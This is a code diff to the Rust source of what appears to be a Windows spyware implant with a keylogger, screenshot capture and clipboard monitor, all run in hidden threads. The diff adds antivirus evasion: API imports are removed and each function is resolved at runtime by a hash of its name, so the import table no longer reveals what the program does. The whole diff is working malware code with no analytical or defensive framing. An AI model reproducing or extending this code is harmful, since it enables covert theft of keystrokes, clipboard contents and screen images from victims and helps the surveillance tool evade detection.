@@ -24,8 +24,117 @@ use anyhow::{anyhow, Result};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 use lazy_static::lazy_static;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
+
+// ── pe_resolve helpers ────────────────────────────────────────────────────────
+
+/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+const fn hash_str_const(s: &[u8]) -> u32 {
+    let mut h: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < s.len() {
+        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+/// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
+const fn hash_wstr_const(w: &[u16]) -> u32 {
+    let mut h: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < w.len() {
+        h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+/// Resolve a function pointer from a DLL that is already loaded in the PEB.
+unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = pe_resolve::get_module_handle_by_hash(dll_hash)
+        .ok_or_else(|| anyhow!("DLL not found (hash 0x{:08X})", dll_hash))?;
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+/// Resolve a function pointer from a DLL, loading it if not already present.
+unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
+        Some(m) => m,
+        None => {
+            let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+            let m = load_library_w(dll_wide.as_ptr());
+            if m.is_null() {
+                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+            }
+            m
+        }
+    };
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+// ── user32.dll wide string & hash ─────────────────────────────────────────────
+const USER32_DLL_W: &[u16] = &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
+
+// ── API hash constants (user32) ───────────────────────────────────────────────
+const HASH_GETDC: u32                      = hash_str_const(b"GetDC\0");
+const HASH_RELEASEDC: u32                  = hash_str_const(b"ReleaseDC\0");
+const HASH_GETSYSTEMMETRICS: u32           = hash_str_const(b"GetSystemMetrics\0");
+const HASH_GETMONITORINFOW: u32            = hash_str_const(b"GetMonitorInfoW\0");
+const HASH_ENUMDISPLAYMONITORS: u32        = hash_str_const(b"EnumDisplayMonitors\0");
+const HASH_SETWINDOWSHOOKEXW: u32          = hash_str_const(b"SetWindowsHookExW\0");
+const HASH_CALLNEXTHOOKEX: u32             = hash_str_const(b"CallNextHookEx\0");
+const HASH_PEEKMESSAGEW: u32               = hash_str_const(b"PeekMessageW\0");
+const HASH_TRANSLATEMESSAGE: u32           = hash_str_const(b"TranslateMessage\0");
+const HASH_DISPATCHMESSAGEW: u32           = hash_str_const(b"DispatchMessageW\0");
+const HASH_UNHOOKWINDOWSHOOKEX: u32        = hash_str_const(b"UnhookWindowsHookEx\0");
+const HASH_GETCLIPBOARDSEQUENCENUMBER: u32 = hash_str_const(b"GetClipboardSequenceNumber\0");
+const HASH_OPENCLIPBOARD: u32              = hash_str_const(b"OpenClipboard\0");
+const HASH_CLOSECLIPBOARD: u32             = hash_str_const(b"CloseClipboard\0");
+const HASH_GETCLIPBOARDDATA: u32           = hash_str_const(b"GetClipboardData\0");
+
+// ── API hash constants (kernel32) ─────────────────────────────────────────────
+const HASH_GLOBALLOCK: u32                 = hash_str_const(b"GlobalLock\0");
+const HASH_GLOBALUNLOCK: u32               = hash_str_const(b"GlobalUnlock\0");
+const HASH_GETMODULEHANDLEW: u32           = hash_str_const(b"GetModuleHandleW\0");
+
+// ── Function pointer types (user32) ───────────────────────────────────────────
+type FnGetDC                      = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnReleaseDC                  = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
+type FnGetSystemMetrics           = unsafe extern "system" fn(i32) -> i32;
+type FnGetMonitorInfoW            = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::winuser::MONITORINFO) -> i32;
+type FnEnumDisplayMonitors        = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut winapi::shared::windef::RECT, std::ffi::c_long) -> i32>, std::ffi::c_long) -> i32;
+type FnSetWindowsHookExW          = unsafe extern "system" fn(i32, Option<unsafe extern "system" fn(i32, usize, usize) -> usize>, *mut std::ffi::c_void, u32) -> *mut std::ffi::c_void;
+type FnCallNextHookEx             = unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, usize) -> usize;
+type FnPeekMessageW               = unsafe extern "system" fn(*mut winapi::um::winuser::MSG, *mut std::ffi::c_void, u32, u32, u32) -> i32;
+type FnTranslateMessage           = unsafe extern "system" fn(*const winapi::um::winuser::MSG) -> i32;
+type FnDispatchMessageW           = unsafe extern "system" fn(*const winapi::um::winuser::MSG) -> usize;
+type FnUnhookWindowsHookEx        = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnGetClipboardSequenceNumber = unsafe extern "system" fn() -> u32;
+type FnOpenClipboard              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnCloseClipboard             = unsafe extern "system" fn() -> i32;
+type FnGetClipboardData           = unsafe extern "system" fn(u32) -> *mut std::ffi::c_void;
+
+// ── Function pointer types (kernel32) ─────────────────────────────────────────
+type FnGlobalLock       = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnGlobalUnlock     = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnGetModuleHandleW = unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void;
+
+// ── Local constants (replacing IAT-producing winapi imports) ──────────────────
+const SM_CXSCREEN: i32       = 0;
+const SM_CYSCREEN: i32       = 1;
+const WH_KEYBOARD_LL: i32    = 13;
+const PM_REMOVE: u32         = 0x0001;
+const CF_UNICODETEXT: u32    = 13;
+const CF_TEXT: u32           = 1;
+const WM_QUIT: u32           = 0x0012;
 
 // ── Constants ──────────────────────────────────────────────────────────────────
 
@@ -82,9 +191,16 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
         BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
         SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
     };
-    use winapi::um::winuser::{GetDC, GetSystemMetrics, ReleaseDC};
 
     unsafe {
+        // Resolve user32 functions at runtime
+        let get_system_metrics: FnGetSystemMetrics =
+            resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETSYSTEMMETRICS)?;
+        let get_dc: FnGetDC =
+            resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
+        let release_dc: FnReleaseDC =
+            resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_RELEASEDC)?;
+
         let (x, y, width, height) = if let Some(idx) = monitor_index {
             let monitors = enumerate_monitors();
             let mon = monitors
@@ -98,8 +214,8 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
                 })?;
             (mon.left, mon.top, mon.right - mon.left, mon.bottom - mon.top)
         } else {
-            let w = GetSystemMetrics(winapi::um::winuser::SM_CXSCREEN);
-            let h = GetSystemMetrics(winapi::um::winuser::SM_CYSCREEN);
+            let w = get_system_metrics(SM_CXSCREEN);
+            let h = get_system_metrics(SM_CYSCREEN);
             if w <= 0 || h <= 0 {
                 return Err(anyhow!(
                     "GetSystemMetrics returned invalid dimensions: {}x{}",
@@ -114,19 +230,19 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             return Err(anyhow!("invalid capture area: {}x{}", width, height));
         }
 
-        let hdc_screen = GetDC(std::ptr::null_mut());
+        let hdc_screen = get_dc(std::ptr::null_mut());
         if hdc_screen.is_null() {
             return Err(anyhow!("GetDC failed"));
         }
         let hdc_mem = CreateCompatibleDC(hdc_screen);
         if hdc_mem.is_null() {
-            ReleaseDC(std::ptr::null_mut(), hdc_screen);
+            release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("CreateCompatibleDC failed"));
         }
         let hbm: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
         if hbm.is_null() {
             DeleteDC(hdc_mem);
-            ReleaseDC(std::ptr::null_mut(), hdc_screen);
+            release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("CreateCompatibleBitmap failed"));
         }
 
@@ -136,7 +252,7 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             SelectObject(hdc_mem, old_obj);
             DeleteObject(hbm as _);
             DeleteDC(hdc_mem);
-            ReleaseDC(std::ptr::null_mut(), hdc_screen);
+            release_dc(std::ptr::null_mut(), hdc_screen);
             return Err(anyhow!("BitBlt failed"));
         }
 
@@ -171,7 +287,7 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
         SelectObject(hdc_mem, old_obj);
         DeleteObject(hbm as _);
         DeleteDC(hdc_mem);
-        ReleaseDC(std::ptr::null_mut(), hdc_screen);
+        release_dc(std::ptr::null_mut(), hdc_screen);
 
         if scan_lines == 0 {
             return Err(anyhow!("GetDIBits failed"));
@@ -204,9 +320,31 @@ struct MonitorRect {
     bottom: i32,
 }
 
+/// Static pointer to resolved GetMonitorInfoW, used by the enum_callback.
+#[cfg(target_os = "windows")]
+static GETMONITORINFO_PTR: AtomicU64 = AtomicU64::new(0);
+
 #[cfg(target_os = "windows")]
 fn enumerate_monitors() -> Vec<MonitorRect> {
     use std::ptr;
+
+    // Resolve user32 functions at runtime
+    let get_monitor_info_w: FnGetMonitorInfoW = unsafe {
+        match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETMONITORINFOW) {
+            Ok(f) => f,
+            Err(_) => return Vec::new(),
+        }
+    };
+    let enum_display_monitors: FnEnumDisplayMonitors = unsafe {
+        match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_ENUMDISPLAYMONITORS) {
+            Ok(f) => f,
+            Err(_) => return Vec::new(),
+        }
+    };
+
+    // Store resolved function pointer for use inside the callback
+    GETMONITORINFO_PTR.store(get_monitor_info_w as u64, Ordering::SeqCst);
+
     let monitors: Box<Mutex<Vec<MonitorRect>>> = Box::new(Mutex::new(Vec::new()));
     let raw = Box::into_raw(monitors) as winapi::shared::minwindef::LPARAM;
 
@@ -216,9 +354,10 @@ fn enumerate_monitors() -> Vec<MonitorRect> {
         _lprc: winapi::shared::windef::LPRECT,
         dw_data: winapi::shared::minwindef::LPARAM,
     ) -> winapi::shared::minwindef::BOOL {
+        let get_monitor_info: FnGetMonitorInfoW = std::mem::transmute(GETMONITORINFO_PTR.load(Ordering::SeqCst));
         let mut mi: winapi::um::winuser::MONITORINFO = std::mem::zeroed();
         mi.cbSize = std::mem::size_of::<winapi::um::winuser::MONITORINFO>() as u32;
-        if winapi::um::winuser::GetMonitorInfoW(hmon, &mut mi) == 0 {
+        if get_monitor_info(hmon, &mut mi) == 0 {
             return 1;
         }
         let rc = mi.rcMonitor;
@@ -235,12 +374,13 @@ fn enumerate_monitors() -> Vec<MonitorRect> {
     }
 
     unsafe {
-        winapi::um::winuser::EnumDisplayMonitors(
+        enum_display_monitors(
             ptr::null_mut(),
             ptr::null_mut(),
             Some(enum_callback),
             raw,
         );
+        GETMONITORINFO_PTR.store(0, Ordering::SeqCst);
         let monitors = Box::from_raw(raw as *mut Mutex<Vec<MonitorRect>>);
         monitors.into_inner().unwrap_or_default()
     }
@@ -385,6 +525,11 @@ pub fn resume_keylogger() -> Result<()> {
 static HOOK_BUFFER_PTR: AtomicU64 = AtomicU64::new(0);
 
 #[cfg(target_os = "windows")]
+/// Static pointer to resolved CallNextHookEx, used by the keyboard callback.
+#[cfg(target_os = "windows")]
+static CALLNEXTHOOK_PTR: AtomicU64 = AtomicU64::new(0);
+
+#[cfg(target_os = "windows")]
 fn start_keylogger_thread_windows(
     buffer: Arc<Mutex<EncryptedBuffer>>,
     running: Arc<AtomicBool>,
@@ -392,10 +537,74 @@ fn start_keylogger_thread_windows(
     crate::evasion::spawn_hidden_thread(move || {
         use winapi::shared::minwindef::{LPARAM, WPARAM};
         use winapi::shared::ntdef::LRESULT;
-        use winapi::um::winuser::{
-            CallNextHookEx, PeekMessageW, SetWindowsHookExW, TranslateMessage, DispatchMessageW,
-            MSG, PM_REMOVE, WH_KEYBOARD_LL,
+
+        // Resolve user32 functions at runtime
+        let call_next_hook_ex: FnCallNextHookEx = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_CALLNEXTHOOKEX) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: CallNextHookEx resolution failed: {}", e);
+                    return;
+                }
+            }
         };
+        let set_windows_hook_ex_w: FnSetWindowsHookExW = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_SETWINDOWSHOOKEXW) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: SetWindowsHookExW resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+        let peek_message_w: FnPeekMessageW = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_PEEKMESSAGEW) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: PeekMessageW resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+        let translate_message: FnTranslateMessage = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_TRANSLATEMESSAGE) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: TranslateMessage resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+        let dispatch_message_w: FnDispatchMessageW = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_DISPATCHMESSAGEW) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: DispatchMessageW resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+        let unhook_windows_hook_ex: FnUnhookWindowsHookEx = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_UNHOOKWINDOWSHOOKEX) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: UnhookWindowsHookEx resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+        let get_module_handle_w: FnGetModuleHandleW = unsafe {
+            match resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GETMODULEHANDLEW) {
+                Ok(f) => f,
+                Err(e) => {
+                    log::error!("surveillance: GetModuleHandleW resolution failed: {}", e);
+                    return;
+                }
+            }
+        };
+
+        // Store resolved CallNextHookEx for use inside the callback
+        CALLNEXTHOOK_PTR.store(call_next_hook_ex as u64, Ordering::SeqCst);
 
         // Store the buffer Arc pointer so the callback can access it.
         HOOK_BUFFER_PTR.store(&buffer as *const _ as u64, Ordering::SeqCst);
@@ -427,27 +636,29 @@ fn start_keylogger_thread_windows(
                     }
                 }
             }
-            CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
+            let call_next: FnCallNextHookEx = std::mem::transmute(CALLNEXTHOOK_PTR.load(Ordering::SeqCst));
+            call_next(std::ptr::null_mut(), n_code, w_param, l_param)
         }
 
         unsafe {
-            let hook = SetWindowsHookExW(
+            let hook = set_windows_hook_ex_w(
                 WH_KEYBOARD_LL,
                 Some(keyboard_proc),
-                winapi::um::libloaderapi::GetModuleHandleW(std::ptr::null()),
+                get_module_handle_w(std::ptr::null()),
                 0,
             );
 
             if hook.is_null() {
                 log::error!("surveillance: SetWindowsHookExW failed");
                 HOOK_BUFFER_PTR.store(0, Ordering::SeqCst);
+                CALLNEXTHOOK_PTR.store(0, Ordering::SeqCst);
                 return;
             }
 
             // Message pump — required for low-level hooks to work.
-            let mut msg: MSG = std::mem::zeroed();
+            let mut msg: winapi::um::winuser::MSG = std::mem::zeroed();
             loop {
-                let has_msg = PeekMessageW(
+                let has_msg = peek_message_w(
                     &mut msg,
                     std::ptr::null_mut(),
                     0,
@@ -455,11 +666,11 @@ fn start_keylogger_thread_windows(
                     PM_REMOVE,
                 );
                 if has_msg != 0 {
-                    if msg.message == winapi::um::winuser::WM_QUIT {
+                    if msg.message == WM_QUIT {
                         break;
                     }
-                    TranslateMessage(&msg);
-                    DispatchMessageW(&msg);
+                    translate_message(&msg);
+                    dispatch_message_w(&msg);
                 }
 
                 if !running.load(Ordering::SeqCst) {
@@ -468,8 +679,9 @@ fn start_keylogger_thread_windows(
                 std::thread::sleep(std::time::Duration::from_millis(10));
             }
 
-            winapi::um::winuser::UnhookWindowsHookEx(hook);
+            unhook_windows_hook_ex(hook);
             HOOK_BUFFER_PTR.store(0, Ordering::SeqCst);
+            CALLNEXTHOOK_PTR.store(0, Ordering::SeqCst);
         }
     })
 }
@@ -580,8 +792,16 @@ fn start_clipboard_thread_windows(
     interval_ms: u64,
 ) -> std::thread::JoinHandle<()> {
     crate::evasion::spawn_hidden_thread(move || {
+        // Resolve user32 functions at runtime
+        let get_clipboard_seq: FnGetClipboardSequenceNumber = unsafe {
+            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETCLIPBOARDSEQUENCENUMBER) {
+                Ok(f) => f,
+                Err(_) => return,
+            }
+        };
+
         let mut last_sequence: u32 =
-            unsafe { winapi::um::winuser::GetClipboardSequenceNumber() };
+            unsafe { get_clipboard_seq() };
 
         while running.load(Ordering::SeqCst) {
             std::thread::sleep(std::time::Duration::from_millis(interval_ms));
@@ -590,7 +810,7 @@ fn start_clipboard_thread_windows(
                 break;
             }
 
-            let seq = unsafe { winapi::um::winuser::GetClipboardSequenceNumber() };
+            let seq = unsafe { get_clipboard_seq() };
             if seq == last_sequence {
                 continue;
             }
@@ -612,20 +832,55 @@ fn start_clipboard_thread_windows(
     })
 }
 
+/// Static pointers for resolved clipboard/user32/kernel32 functions, used by RAII guards.
+#[cfg(target_os = "windows")]
+static CLOSECLIPBOARD_PTR: AtomicU64 = AtomicU64::new(0);
+#[cfg(target_os = "windows")]
+static GLOBALLOCK_PTR: AtomicU64 = AtomicU64::new(0);
+#[cfg(target_os = "windows")]
+static GLOBALUNLOCK_PTR: AtomicU64 = AtomicU64::new(0);
+
 #[cfg(target_os = "windows")]
 fn get_clipboard_windows() -> Result<String> {
     use std::ffi::OsString;
     use std::os::windows::ffi::OsStringExt;
 
+    // Resolve user32 functions at runtime
+    let open_clipboard: FnOpenClipboard = unsafe {
+        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_OPENCLIPBOARD)?
+    };
+    let close_clipboard: FnCloseClipboard = unsafe {
+        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_CLOSECLIPBOARD)?
+    };
+    let get_clipboard_data: FnGetClipboardData = unsafe {
+        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETCLIPBOARDDATA)?
+    };
+    // Resolve kernel32 functions
+    let global_lock: FnGlobalLock = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALLOCK)?
+    };
+    let global_unlock: FnGlobalUnlock = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALUNLOCK)?
+    };
+
+    // Store resolved functions for RAII guard access
+    CLOSECLIPBOARD_PTR.store(close_clipboard as u64, Ordering::SeqCst);
+    GLOBALLOCK_PTR.store(global_lock as u64, Ordering::SeqCst);
+    GLOBALUNLOCK_PTR.store(global_unlock as u64, Ordering::SeqCst);
+
     unsafe {
-        if winapi::um::winuser::OpenClipboard(std::ptr::null_mut()) == 0 {
+        if open_clipboard(std::ptr::null_mut()) == 0 {
+            CLOSECLIPBOARD_PTR.store(0, Ordering::SeqCst);
+            GLOBALLOCK_PTR.store(0, Ordering::SeqCst);
+            GLOBALUNLOCK_PTR.store(0, Ordering::SeqCst);
             return Err(anyhow!("OpenClipboard failed"));
         }
         struct CloseCbGuard;
         impl Drop for CloseCbGuard {
             fn drop(&mut self) {
                 unsafe {
-                    winapi::um::winuser::CloseClipboard();
+                    let close_fn: FnCloseClipboard = std::mem::transmute(CLOSECLIPBOARD_PTR.load(Ordering::SeqCst));
+                    close_fn();
                 }
             }
         }
@@ -633,45 +888,58 @@ fn get_clipboard_windows() -> Result<String> {
 
         // Try CF_UNICODETEXT first
         let handle =
-            winapi::um::winuser::GetClipboardData(winapi::um::winuser::CF_UNICODETEXT);
+            get_clipboard_data(CF_UNICODETEXT);
         if !handle.is_null() {
-            let ptr = winapi::um::winbase::GlobalLock(handle) as *const u16;
+            let lock_fn: FnGlobalLock = std::mem::transmute(GLOBALLOCK_PTR.load(Ordering::SeqCst));
+            let ptr = lock_fn(handle) as *const u16;
             if !ptr.is_null() {
                 struct UnlockG(*mut std::ffi::c_void);
                 impl Drop for UnlockG {
                     fn drop(&mut self) {
                         unsafe {
-                            winapi::um::winbase::GlobalUnlock(self.0);
+                            let unlock_fn: FnGlobalUnlock = std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
+                            unlock_fn(self.0);
                         }
                     }
                 }
                 let _unlock = UnlockG(handle);
                 let len = (0..).take_while(|&i| *ptr.offset(i) != 0).count();
                 let text = OsString::from_wide(std::slice::from_raw_parts(ptr, len));
+                CLOSECLIPBOARD_PTR.store(0, Ordering::SeqCst);
+                GLOBALLOCK_PTR.store(0, Ordering::SeqCst);
+                GLOBALUNLOCK_PTR.store(0, Ordering::SeqCst);
                 return Ok(text.to_string_lossy().into_owned());
             }
         }
 
         // Fallback: CF_TEXT
-        let handle = winapi::um::winuser::GetClipboardData(winapi::um::winuser::CF_TEXT);
+        let handle = get_clipboard_data(CF_TEXT);
         if !handle.is_null() {
-            let ptr = winapi::um::winbase::GlobalLock(handle) as *const i8;
+            let lock_fn: FnGlobalLock = std::mem::transmute(GLOBALLOCK_PTR.load(Ordering::SeqCst));
+            let ptr = lock_fn(handle) as *const i8;
             if !ptr.is_null() {
                 struct UnlockG(*mut std::ffi::c_void);
                 impl Drop for UnlockG {
                     fn drop(&mut self) {
                         unsafe {
-                            winapi::um::winbase::GlobalUnlock(self.0);
+                            let unlock_fn: FnGlobalUnlock = std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
+                            unlock_fn(self.0);
                         }
                     }
                 }
                 let _unlock = UnlockG(handle);
                 let len = (0..).take_while(|&i| *ptr.offset(i) != 0).count();
                 let bytes = std::slice::from_raw_parts(ptr as *const u8, len);
+                CLOSECLIPBOARD_PTR.store(0, Ordering::SeqCst);
+                GLOBALLOCK_PTR.store(0, Ordering::SeqCst);
+                GLOBALUNLOCK_PTR.store(0, Ordering::SeqCst);
                 return Ok(String::from_utf8_lossy(bytes).into_owned());
             }
         }
 
+        CLOSECLIPBOARD_PTR.store(0, Ordering::SeqCst);
+        GLOBALLOCK_PTR.store(0, Ordering::SeqCst);
+        GLOBALUNLOCK_PTR.store(0, Ordering::SeqCst);
         Err(anyhow!("no text data in clipboard"))
     }
 }
